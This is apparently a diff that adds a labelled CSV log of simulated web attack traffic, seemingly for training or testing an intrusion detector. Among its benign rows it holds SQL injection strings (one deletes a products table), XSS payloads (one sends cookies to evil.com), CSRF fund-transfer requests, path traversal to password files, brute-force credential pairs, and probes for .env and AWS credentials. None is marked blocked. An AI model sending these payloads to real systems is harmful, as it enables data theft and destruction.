@@ -1,0 +1,140 @@
+timestamp,attack_type,payload_snippet,label,status_code,blocked
+2026-06-22T15:11:49.239943,sqli,'; DELETE FROM products WHERE 1=1--,1,N/A,False
+2026-06-22T15:11:51.592796,sqli,'; DELETE FROM products WHERE 1=1--,1,N/A,False
+2026-06-22T15:11:54.024786,sqli,'; WAITFOR DELAY '00:00:05'--,1,N/A,False
+2026-06-22T15:11:56.300883,sqli,' OR 1=1--,1,N/A,False
+2026-06-22T15:11:59.407200,sqli,' AND 1=1--,1,N/A,False
+2026-06-22T15:12:02.472040,sqli,"' UNION SELECT @@version,NULL,NULL--",1,N/A,False
+2026-06-22T15:12:04.861180,sqli,"' UNION SELECT NULL,NULL,NULL--",1,N/A,False
+2026-06-22T15:12:07.300512,sqli,"' UNION SELECT @@version,NULL,NULL--",1,N/A,False
+2026-06-22T15:12:09.626262,sqli,' OR 1=1--,1,N/A,False
+2026-06-22T15:12:12.663627,sqli,' AND SLEEP(5)--,1,N/A,False
+2026-06-22T15:12:15.105837,sqli,admin'--,1,N/A,False
+2026-06-22T15:12:17.317265,sqli,"' UNION SELECT NULL,NULL,NULL--",1,N/A,False
+2026-06-22T15:12:20.439386,sqli,"' UNION SELECT NULL,NULL,NULL--",1,N/A,False
+2026-06-22T15:12:23.441394,sqli,admin'--,1,N/A,False
+2026-06-22T15:12:25.861232,sqli,admin'--,1,N/A,False
+2026-06-22T15:12:28.329134,benign,normal_request,0,N/A,False
+2026-06-22T15:12:30.834425,benign,normal_request,0,200,False
+2026-06-22T15:12:33.714735,benign,normal_request,0,201,False
+2026-06-22T15:12:36.376471,benign,normal_request,0,201,False
+2026-06-22T15:12:39.065432,benign,normal_request,0,200,False
+2026-06-22T15:12:41.674294,benign,normal_request,0,200,False
+2026-06-22T15:12:44.530512,benign,normal_request,0,N/A,False
+2026-06-22T15:12:47.196065,benign,normal_request,0,N/A,False
+2026-06-22T15:12:49.545532,benign,normal_request,0,N/A,False
+2026-06-22T15:12:51.913254,benign,normal_request,0,201,False
+2026-06-22T15:12:54.497024,xss,<input onfocus=alert(1) autofocus>,1,201,False
+2026-06-22T15:12:56.778291,xss,<script>alert(document.cookie)</script>,1,201,False
+2026-06-22T15:12:59.028733,xss,<input onfocus=alert(1) autofocus>,1,201,False
+2026-06-22T15:13:01.386151,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,201,False
+2026-06-22T15:13:03.646095,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,201,False
+2026-06-22T15:13:05.814070,xss,<input onfocus=alert(1) autofocus>,1,201,False
+2026-06-22T15:13:08.130948,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,201,False
+2026-06-22T15:13:10.349818,xss,<script>alert(document.cookie)</script>,1,201,False
+2026-06-22T15:13:12.549090,xss,<script>alert(document.cookie)</script>,1,201,False
+2026-06-22T15:13:14.859615,xss,<input onfocus=alert(1) autofocus>,1,201,False
+2026-06-22T15:13:17.050818,xss,<iframe src='javascript:alert(1)'>,1,201,False
+2026-06-22T15:13:19.370252,xss,<iframe src='javascript:alert(1)'>,1,201,False
+2026-06-22T15:13:21.756446,benign,normal_request,0,N/A,False
+2026-06-22T15:13:24.399144,benign,normal_request,0,N/A,False
+2026-06-22T15:13:27.136401,benign,normal_request,0,N/A,False
+2026-06-22T15:13:29.394653,benign,normal_request,0,N/A,False
+2026-06-22T15:13:31.952872,benign,normal_request,0,201,False
+2026-06-22T15:13:34.411194,benign,normal_request,0,N/A,False
+2026-06-22T15:13:37.261757,benign,normal_request,0,200,False
+2026-06-22T15:13:39.788158,benign,normal_request,0,201,False
+2026-06-22T15:13:42.134771,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
+2026-06-22T15:13:44.451052,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
+2026-06-22T15:13:47.002766,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
+2026-06-22T15:13:49.448330,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
+2026-06-22T15:13:52.019919,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
+2026-06-22T15:13:54.335431,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
+2026-06-22T15:13:56.889933,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
+2026-06-22T15:13:59.215685,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
+2026-06-22T15:14:01.526555,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
+2026-06-22T15:14:04.038111,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
+2026-06-22T15:14:06.550173,benign,normal_request,0,N/A,False
+2026-06-22T15:14:08.870509,benign,normal_request,0,N/A,False
+2026-06-22T15:14:11.399331,benign,normal_request,0,201,False
+2026-06-22T15:14:14.117165,benign,normal_request,0,201,False
+2026-06-22T15:14:16.488819,benign,normal_request,0,201,False
+2026-06-22T15:14:18.858903,benign,normal_request,0,201,False
+2026-06-22T15:14:21.363966,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,N/A,False
+2026-06-22T15:14:21.543557,path_traversal,....//....//....//etc/passwd,1,N/A,False
+2026-06-22T15:14:21.887560,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,N/A,False
+2026-06-22T15:14:22.181298,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
+2026-06-22T15:14:24.576872,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
+2026-06-22T15:14:27.061520,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
+2026-06-22T15:14:27.445996,path_traversal,..\..\..\windows\system32\config\sam,1,N/A,False
+2026-06-22T15:14:27.756008,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
+2026-06-22T15:14:30.221349,path_traversal,....//....//....//etc/passwd,1,N/A,False
+2026-06-22T15:14:32.601717,path_traversal,/var/www/../../etc/passwd,1,N/A,False
+2026-06-22T15:14:34.951755,benign,normal_request,0,N/A,False
+2026-06-22T15:14:37.254993,benign,normal_request,0,200,False
+2026-06-22T15:14:40.025944,benign,normal_request,0,200,False
+2026-06-22T15:14:42.439395,benign,normal_request,0,N/A,False
+2026-06-22T15:14:45.175714,benign,normal_request,0,N/A,False
+2026-06-22T15:14:47.690815,benign,normal_request,0,N/A,False
+2026-06-22T15:14:50.553233,benign,normal_request,0,201,False
+2026-06-22T15:14:53.359779,benign,normal_request,0,201,False
+2026-06-22T15:14:56.737197,brute_force,test:Admin@123,1,N/A,False
+2026-06-22T15:14:59.592620,brute_force,test:123456,1,N/A,False
+2026-06-22T15:15:02.650435,brute_force,root:letmein,1,N/A,False
+2026-06-22T15:15:05.472030,brute_force,root:Admin@123,1,N/A,False
+2026-06-22T15:15:10.371085,brute_force,user:password,1,N/A,False
+2026-06-22T15:15:12.618109,brute_force,root:password,1,N/A,False
+2026-06-22T15:15:14.884951,brute_force,administrator:123456,1,N/A,False
+2026-06-22T15:15:17.055959,brute_force,root:Admin@123,1,N/A,False
+2026-06-22T15:15:19.227256,brute_force,root:password,1,N/A,False
+2026-06-22T15:15:21.398075,brute_force,user:123456,1,N/A,False
+2026-06-22T15:15:23.599699,brute_force,user:admin123,1,N/A,False
+2026-06-22T15:15:25.779195,brute_force,user:Admin@123,1,N/A,False
+2026-06-22T15:15:27.996376,brute_force,admin:password,1,N/A,False
+2026-06-22T15:15:30.259513,brute_force,root:123456,1,N/A,False
+2026-06-22T15:15:32.506335,brute_force,user:password,1,N/A,False
+2026-06-22T15:15:34.627682,brute_force,root:123456,1,N/A,False
+2026-06-22T15:15:36.893849,brute_force,user:Admin@123,1,N/A,False
+2026-06-22T15:15:39.087164,brute_force,administrator:admin123,1,N/A,False
+2026-06-22T15:15:41.361498,brute_force,root:Admin@123,1,N/A,False
+2026-06-22T15:15:43.541372,brute_force,test:letmein,1,N/A,False
+2026-06-22T15:15:45.829719,brute_force,root:letmein,1,N/A,False
+2026-06-22T15:15:47.927361,brute_force,test:123456,1,N/A,False
+2026-06-22T15:15:50.088525,brute_force,user:password,1,N/A,False
+2026-06-22T15:15:52.278038,brute_force,admin:admin123,1,N/A,False
+2026-06-22T15:15:54.504942,brute_force,user:Admin@123,1,N/A,False
+2026-06-22T15:15:56.780365,benign,normal_request,0,N/A,False
+2026-06-22T15:15:59.614115,benign,normal_request,0,200,False
+2026-06-22T15:16:02.011289,benign,normal_request,0,200,False
+2026-06-22T15:16:04.426601,benign,normal_request,0,200,False
+2026-06-22T15:16:07.189118,benign,normal_request,0,200,False
+2026-06-22T15:16:09.683820,benign,normal_request,0,N/A,False
+2026-06-22T15:16:12.185940,benign,normal_request,0,N/A,False
+2026-06-22T15:16:14.548416,benign,normal_request,0,200,False
+2026-06-22T15:16:17.180505,benign,normal_request,0,N/A,False
+2026-06-22T15:16:19.698884,benign,normal_request,0,201,False
+2026-06-22T15:16:27.105618,recon,/db/virex.db,1,N/A,False
+2026-06-22T15:16:29.363902,recon,/server-status,1,N/A,False
+2026-06-22T15:16:35.283528,recon,/.aws/credentials,1,N/A,False
+2026-06-22T15:16:42.505525,recon,/db/virex.db,1,N/A,False
+2026-06-22T15:16:49.666779,recon,/db/virex.db,1,N/A,False
+2026-06-22T15:16:56.892706,recon,/db/virex.db,1,N/A,False
+2026-06-22T15:16:59.122820,recon,/.git/HEAD,1,N/A,False
+2026-06-22T15:17:05.583232,recon,/.env,1,N/A,False
+2026-06-22T15:17:09.002558,recon,/db/virex.db,1,N/A,False
+2026-06-22T15:17:12.495915,recon,/backup.sql,1,N/A,False
+2026-06-22T15:17:14.674297,recon,/server-status,1,N/A,False
+2026-06-22T15:17:16.900366,recon,/phpmyadmin,1,N/A,False
+2026-06-22T15:17:21.310388,recon,/.env,1,N/A,False
+2026-06-22T15:17:25.591813,recon,/.git/config,1,N/A,False
+2026-06-22T15:17:29.083897,recon,/backup.sql,1,N/A,False
+2026-06-22T15:17:31.268034,benign,normal_request,0,201,False
+2026-06-22T15:17:34.093056,benign,normal_request,0,201,False
+2026-06-22T15:17:36.964187,benign,normal_request,0,200,False
+2026-06-22T15:17:39.368009,benign,normal_request,0,N/A,False
+2026-06-22T15:17:41.693715,benign,normal_request,0,N/A,False
+2026-06-22T15:17:44.030435,benign,normal_request,0,201,False
+2026-06-22T15:17:46.385962,benign,normal_request,0,N/A,False
+2026-06-22T15:17:48.689957,benign,normal_request,0,200,False
+2026-06-22T15:17:51.224126,benign,normal_request,0,N/A,False
+2026-06-22T15:17:53.779079,benign,normal_request,0,N/A,False
